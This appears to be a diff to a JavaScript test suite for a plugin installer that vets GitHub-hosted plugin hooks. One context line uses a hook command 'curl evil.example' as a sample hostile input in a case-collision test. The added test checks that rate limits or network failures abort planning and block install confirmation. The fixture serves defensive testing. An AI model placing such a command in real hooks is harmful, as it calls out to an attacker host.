@@ -80,3 +80,27 @@ test('two hooks files that differ only in case block the plan: which one macOS k
   const { p } = await plan({}, { more: { 'guard/hooks/hooks.json': JSON.stringify({ hooks: hook('echo benign') }), 'guard/Hooks/hooks.json': JSON.stringify({ hooks: hook('curl evil.example') }) } });
   assert.ok(p.body.blockers.some((b) => /differ only in case/.test(b)), p.body.blockers.join('\n'));
 });
+
+test('GitHub failing while the plugin\'s files are read (rate limit, network) fails the plan; it never says "could not be listed"', async () => {
+  const { createClient } = await import('../scripts/lib/github.mjs');
+  const { confirmInstall } = await import('../scripts/lib/installer.mjs');
+  const repos = { p: { readme: '# p', topics: ['claude-code-plugin'], files: { '.claude-plugin/marketplace.json': JSON.stringify({ name: 'p-tools', plugins: [{ name: 'guard', source: './guard' }] }), 'guard/.claude-plugin/plugin.json': '{"name":"guard"}', 'guard/hooks/hooks.json': JSON.stringify({ hooks: hook('echo hi') }) } } };
+  for (const failure of ['network', 'rate']) {
+    const s = setup(repos);
+    let broken = false;
+    const fetchImpl = async (url, o) => {
+      if (broken && /guard\/\.claude-plugin\/plugin\.json/.test(url)) {
+        if (failure === 'network') throw Object.assign(new Error('fetch failed'), { cause: { code: 'ECONNRESET' } });
+        return { ok: false, status: 403, headers: { get: (k) => ({ 'x-ratelimit-remaining': '0', 'x-ratelimit-reset': String(Math.floor(Date.now() / 1000) + 3600) })[k.toLowerCase()] ?? null } };
+      }
+      return s.fetchImpl(url, o);
+    };
+    const ctx = () => s.ctx({ client: createClient({ fetchImpl, maxWaitMs: 0 }) });
+    const plan = await makePlan({ ...ctx(), repo: 'o/p' });
+    assert.ok(plan.body.hooks?.length, failure);
+    broken = true;
+    await assert.rejects(makePlan({ ...ctx(), repo: 'o/p' }), /could not reach GitHub|rate limit/, `${failure}: --plan fails`);
+    const res = await confirmInstall({ ...ctx(), repo: 'o/p', id: plan.id });
+    assert.match(res.reason, /could not re-check the plan/, `${failure}: ${res.reason}`);
+  }
+});
